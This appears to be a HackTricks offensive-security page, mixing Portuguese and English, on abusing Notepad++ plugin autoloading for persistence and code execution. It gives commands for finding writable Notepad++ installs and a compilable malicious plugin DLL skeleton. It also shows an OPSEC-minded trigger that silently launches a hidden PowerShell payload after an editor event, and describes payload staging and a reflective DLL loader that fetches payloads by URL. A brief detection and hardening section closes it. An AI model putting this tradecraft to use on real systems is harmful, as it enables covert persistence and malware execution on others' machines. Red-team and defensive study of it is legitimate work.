# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ vai **autoload every plugin DLL found under its `plugins` subfolders** na inicialização. Colocar um plugin malicioso em qualquer **instalação gravável do Notepad++** gera code execution dentro de `notepad++.exe` toda vez que o editor inicia, o que pode ser abusado para **persistence**, **initial execution** furtiva, ou como um **in-process loader** se o editor for iniciado elevado.

Desde o **Notepad++ 7.6+** o layout esperado para instalação manual é **uma subpasta por plugin** (`plugins\<PluginName>\<PluginName>.dll`). Em **portable mode** (presença de `doLocalConf.xml` ao lado de `notepad++.exe`), toda a árvore da aplicação permanece local nesse diretório, o que muitas vezes transforma bundles copiados/de ferramentas de admin em uma superfície de execução facilmente gravável pelo usuário.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (geralmente requer admin para escrever).
- Writable options for low-privileged operators:
- Use the **portable Notepad++ build** in a user-writable folder.
- Copy `C:\Program Files\Notepad++` to a user-controlled path (e.g. `%LOCALAPPDATA%\npp\`) and run `notepad++.exe` from there.
- Hunt for **admin tool bundles**, extracted zip copies, or help-desk toolkits that already contain `doLocalConf.xml` and live outside `Program Files`.
- Each plugin gets its own subfolder under `plugins` and is loaded automatically at startup; menu entries appear under **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Pontos de carregamento do plugin (primitivos de execução)
Notepad++ espera funções **exportadas** específicas. Todas elas são chamadas durante a inicialização, dando múltiplas superfícies de execução:
- **`DllMain`** — executa imediatamente no carregamento da DLL (primeiro ponto de execução).
- **`setInfo(NppData)`** — chamada uma vez no load para fornecer os handles do Notepad++; local típico para registrar itens de menu.
- **`getName()`** — retorna o nome do plugin mostrado no menu.
- **`getFuncsArray(int *nbF)`** — retorna comandos de menu; mesmo se estiver vazio, é chamado durante a startup.
- **`beNotified(SCNotification*)`** — recebe eventos do Notepad++ / Scintilla (útil para adiar payloads até uma ação do usuário ou evento do editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — manipulador de mensagens, útil para trocas de dados maiores.
- **`isUnicode()`** — flag de compatibilidade verificada no load.

A maioria dos exports pode ser implementada como **stubs**; a execução pode ocorrer a partir de `DllMain` ou de qualquer callback acima durante o autoload.

## Estrutura mínima de plugin malicioso
Compile uma DLL com os exports esperados e coloque-a em `plugins\\MyNewPlugin\\MyNewPlugin.dll` dentro de uma pasta do Notepad++ gravável:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compile a DLL (Visual Studio/MinGW).
2. Crie a subpasta do plugin em `plugins` e coloque a DLL dentro.
3. Reinicie o Notepad++; a DLL é carregada automaticamente, executando `DllMain` e callbacks subsequentes.

## Padrão de disparo de baixo ruído via `beNotified`
Para OPSEC, muitos payloads **não** devem ser disparados a partir de `DllMain`. Um padrão mais discreto é deixar o plugin carregar normalmente e então executar apenas após um evento realista do editor, como **startup complete**, **buffer activation** ou o **primeiro caractere digitado**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Isso se encaixa melhor com pesquisa ofensiva pública do que um beacon `DllMain` barulhento: a DLL ainda é carregada automaticamente na inicialização, mas a ação maliciosa é adiada até o Notepad++ parecer realmente em uso.

## Using the plugin config directory as secondary storage
Notepad++ expõe `NPPM_GETPLUGINSCONFIGDIR`, que retorna o **diretório de configuração de plugins do usuário atual**. Um plugin malicioso pode usar isso para manter a DLL em disco mínima enquanto armazena config criptografada, payloads staged ou tasking files em um path que se mistura com o estado normal do plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operacionalmente isso é útil quando você quer:
- uma tiny bootstrap DLL carregada automaticamente;
- tasking por usuário sem tocar novamente no main plugin binary;
- separar o **autoload trigger** da second stage mais pesada.

## Reflective loader plugin pattern
Um plugin weaponized pode transformar o Notepad++ em um **reflective DLL loader**:
- Exibir uma interface/menu entry minimal (por exemplo, "LoadDLL").
- Aceitar um **file path** ou **URL** para buscar uma payload DLL.
- Fazer o map da DLL reflective no processo atual e invocar um exported entry point (por exemplo, uma loader function dentro da DLL buscada).
- Benefício: reutilizar um processo GUI com aparência benigna em vez de iniciar um novo loader; a payload herda a integrity do `notepad++.exe` (incluindo contextos elevated).
- Trade-offs: colocar uma **unsigned plugin DLL** no disco é ruidoso; uma variação prática é usar o plugin autoloaded apenas como um stub e manter o implant real encrypted/staged em outro lugar.

## Detection and hardening notes
- Bloquear ou monitorar **writes to Notepad++ plugin directories** (incluindo cópias portable em perfis de usuário); habilitar controlled folder access ou application allowlisting.
- Gerar alertas para **new unsigned DLLs** em `plugins`, mudanças em árvores portable do Notepad++ e **child processes/network activity** incomuns a partir de `notepad++.exe`.
- Fazer baseline dos plugins legítimos e investigar qualquer nova DLL que exporte a interface normal de plugin do Notepad++ mas também inicie shells, PowerShell ou network beacons.
- Impor a instalação de plugins apenas via **Plugins Admin**, e restringir a execução de cópias portable a partir de paths não confiáveis.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
